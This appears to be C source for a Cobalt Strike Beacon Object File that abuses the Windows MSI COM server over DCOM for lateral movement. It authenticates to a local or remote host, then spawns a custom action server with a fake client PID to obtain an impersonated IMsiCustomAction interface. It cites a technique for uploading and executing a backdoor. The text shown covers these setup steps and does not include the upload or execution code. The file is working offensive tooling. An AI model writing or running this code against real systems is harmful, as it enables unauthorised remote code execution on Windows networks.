//msilat.c
#include <Windows.h>
#include "beacon.h"
#include "bofdefs.h"
#include "msilat.h"
#include "comstuff.c"
#include "comstuff.h"
#include "utils.c"
#include "objbase.h"

HRESULT get_custom_action_server(IUnknown* pIMsiServerAuthd, IMsiCustomAction** ppIMsiCustomAction, COAUTHINFO* pAuth) {

    // Shoutout to Eliran Nasser 
    // The technique for getting the custom action server was written about here:
    // https://www.deepinstinct.com/blog/forget-psexec-dcom-upload-execute-backdoor

    // Create MSIRemoteAPI struct from DLL Factory
    HMODULE hMsi = KERNEL32$LoadLibraryW(L"msi.dll");
    IMsiRemoteAPI* pRemApi = (IMsiRemoteAPI*)CreateObjectFromDllFactory(hMsi, CLSID_MSIRemoteApi);

    if (!pRemApi) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to create IMsiRemoteAPI interface");
        return E_FAIL;
    }
    
    IMsiCustomAction* pMsiAction = NULL;
    const unsigned long fakeRemoteClientPid = 4; 
    unsigned long outServerPid = 0;
    int iRemoteAPICookieSize = COOKIE_SIZE;
    char rgchCookie[COOKIE_SIZE];
    MSVCRT$memset(rgchCookie, 0, COOKIE_SIZE);

    WCHAR* pvEnvironment = KERNEL32$GetEnvironmentStringsW();
    DWORD cEnv = GetEnvironmentSizeW(pvEnvironment);

    HRESULT msiresult = ((IMsiConfigurationManager*)pIMsiServerAuthd)->lpVtbl->CreateCustomActionServer(
        (IMsiConfigurationManager*)pIMsiServerAuthd,
        icac64Impersonated,
        fakeRemoteClientPid,
        pRemApi,
        pvEnvironment,
        cEnv,
        0,
        rgchCookie,
        &iRemoteAPICookieSize,
        &pMsiAction,
        &outServerPid, 
        FALSE
        );
    
    KERNEL32$FreeEnvironmentStringsW(pvEnvironment);

    if (!pMsiAction) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ERROR: 0x%08X Calling CreateCustomActionServer\n", msiresult);
        pRemApi->lpVtbl->Release(pRemApi);
        return E_FAIL;
    }

    IMsiCustomAction* authedAction = NULL;
    HRESULT hr = SetupAuthOnParentIUnknownCastToIID((IUnknown*)pMsiAction, pAuth, (IUnknown**)&authedAction, &IID_IMsiCustomAction);

    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] SetupAuthOnParentIUnknownCastToIID for IMsiCustomAction Failed");
        pMsiAction->lpVtbl->Release(pMsiAction);
        pRemApi->lpVtbl->Release(pRemApi);
        return E_FAIL;
    }


    pMsiAction->lpVtbl->Release(pMsiAction);
    *ppIMsiCustomAction = (IMsiCustomAction*)authedAction;
    pRemApi->lpVtbl->Release(pRemApi);

    return S_OK;
}

HRESULT auth_msi_server(COAUTHINFO* pAuth, PWSTR hostname, IUnknown** ppIMsiServerAuthd) {
    HRESULT hr = S_OK;
    IUnknown* pIMsiServer = NULL;
    COSERVERINFO* pServerInfo = NULL;

    CLSCTX dwClsCtx;
    if (hostname == NULL || MSVCRT$wcslen(hostname) == 0) {
        dwClsCtx = CLSCTX_LOCAL_SERVER;
        BeaconPrintf(CALLBACK_OUTPUT, "[-] CLSCTX: LOCAL\n");
    } else {
        dwClsCtx = CLSCTX_REMOTE_SERVER;
        BeaconPrintf(CALLBACK_OUTPUT, "[-] CLSCTX: REMOTE (%ls)\n", hostname);
    }

    // Initialize COM
    hr = OLE32$CoInitialize(NULL);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, " [!] CoInitialize Failed with: 0x%08X\n", hr);
    }

    // Set up SOLE_AUTHENTICATION_INFO
    SOLE_AUTHENTICATION_INFO sai = {0};
    sai.dwAuthnSvc = pAuth->dwAuthnSvc;
    sai.dwAuthzSvc = pAuth->dwAuthzSvc;
    sai.pAuthInfo = pAuth->pAuthIdentityData;

    // Set up SOLE_AUTHENTICATION_LIST
    SOLE_AUTHENTICATION_LIST sal = {0};
    sal.cAuthInfo = 1;
    sal.aAuthInfo = &sai;

    // Initialize COM Security
    BeaconPrintf(CALLBACK_OUTPUT, "[-] Calling CoInitializeSecurity\n");
    hr = OLE32$CoInitializeSecurity(NULL, -1, NULL, NULL, pAuth->dwAuthnLevel, pAuth->dwImpersonationLevel, &sal, EOAC_NONE, NULL);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CoInitializeSecurity Failed with: 0x%08X\n", hr);
        return hr;
    }

    // Set Server Info only for remote connections
    COSERVERINFO coServerInfo = {0};
    if (dwClsCtx == CLSCTX_REMOTE_SERVER) {
        coServerInfo.pwszName = (LPWSTR)hostname;
        coServerInfo.pAuthInfo = pAuth;
        pServerInfo = &coServerInfo;
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Calling CoCreateInstanceEx on remote server: %ls\n", hostname);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Calling CoCreateInstanceEx on local server\n");
    }

    // Init MULTI_QI for CoCreateInstanceEx
    MULTI_QI qi;
    MSVCRT$memset(&qi, 0, sizeof(qi));
    qi.pIID = &IID_IMsiServer;

    hr = OLE32$CoCreateInstanceEx(&CLSID_MsiServer, NULL, dwClsCtx, pServerInfo, 1, &qi);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CoCreateInstanceEx Failed with: 0x%08X\n", hr);
        return hr;
    }
    if (FAILED(qi.hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] QueryInterface for IMsiServer failed: 0x%08X\n", qi.hr);
        return qi.hr;  // Return qi.hr instead of hr here
    }
    pIMsiServer = qi.pItf;
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Got pointer to MsiServer interface at: %p\n", (void*)pIMsiServer);
  
    // Only set up auth for remote connections
    if (dwClsCtx == CLSCTX_REMOTE_SERVER) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Calling SetupAuthOnParentIUnknownCastToIID\n");
        hr = SetupAuthOnParentIUnknownCastToIID(pIMsiServer, pAuth, ppIMsiServerAuthd, &IID_IMsiServer);
    } else {
        // For local connections, just return the interface directly
        *ppIMsiServerAuthd = pIMsiServer;
        pIMsiServer->lpVtbl->AddRef(pIMsiServer);  // AddRef since we're returning it
        hr = S_OK;
    }
  
    pIMsiServer->lpVtbl->Release(pIMsiServer);
  
    return hr;
}
